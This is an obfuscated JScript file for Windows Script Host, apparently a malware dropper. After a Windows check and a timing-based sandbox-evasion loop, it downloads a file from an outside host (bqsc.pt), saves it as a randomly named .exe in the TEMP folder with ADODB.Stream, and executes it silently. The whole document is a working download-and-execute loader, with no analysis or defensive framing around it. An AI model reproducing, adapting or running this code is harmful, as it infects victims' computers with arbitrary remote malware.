var _Y0 = false;
var _B0 = "CreateObject";
var _U = function _F() {return WScript[_B0]("WScript"+".Shell");}(), _ZZ = 11;
var _CV = "MSXML2.XMLHTTP";
var _I = 2123213;
var _LL = 0;
function _B(_TG){_U["Run"](_TG, _LL, _LL);};
function _PD(){return _CV + "";};
function _EW(_HA, _NB){_LL = _LL * 1; return _HA - _NB;};
function _EP(){return _B0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Y0 = true;
  @end
@*/
if (_Y0)
{
var _W = "";
function _SX(){return 22;};
var _BL = 0; var _CE = 0;
function _VC()
{
var _Y = new this["Date"]();
var _V = _Y["getUTCMilliseconds"]();
WScript["Sleep"](_SX());
var _Y = new this["Date"]();
var _MR = _Y["getUTCMilliseconds"]();
WScript["Sleep"](_SX());
var _Y = new this["Date"]();
var _E = _Y["getUTCMilliseconds"]();
var _BL = "_FF";
_BL = _EW(_MR, _V);
var _CE = "_TF";
_CE = _EW(_E, _MR);
_W = "open";
return _EW(_BL, _CE);
}
var _A = false;
var _XJ = false;
for (var _IA = _LL; _IA < _SX() * 1; _IA++){if (_VC() != _LL){
_A = true; 
_CE = "31" + 11 * _BL + _CE; 
_XJ = true; 
break;
}}
function _C() {return ((_A == true) && (_A == _XJ)) ? 1 : _LL;};
if (_A && _C() && _XJ){
function _H() {return _U["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "usgJrqyrIdYUr.ex" + "e";};
 _S = _PD();
 _OH = WScript[_B0](_S);
 var _OQ = 1;
 while (_OQ){
try {
	if (_OQ == 1)
	{
		_OH[_W]("GET", "http://bqsc.pt/c6ska", false);
		_OH["send"]();
		_FC = "Sleep";
	}
	WScript[_FC](_SX() + 120); 
	if (_OH["readystate"] < 2 * 2) continue;
	_OQ = _LL;
	function _L(_C0) {var _ML = (1, 2, 3, 4, 5, _C0); return _ML;};
	_R = WScript[_EP()]("ADODB.Stream");
	_S = _R;
	_S[_W]();
	_S["type"] = _L(1);
	_S["write"](_OH["ResponseBody"]);
	_R["position"] = _L(_LL);
	_S["Save" + "ToFile"](_H(), 2);
	_R["cl"+"ose"]();
	_JG = _H();
	_B(_JG);
} catch(_F0){};
}
}
}

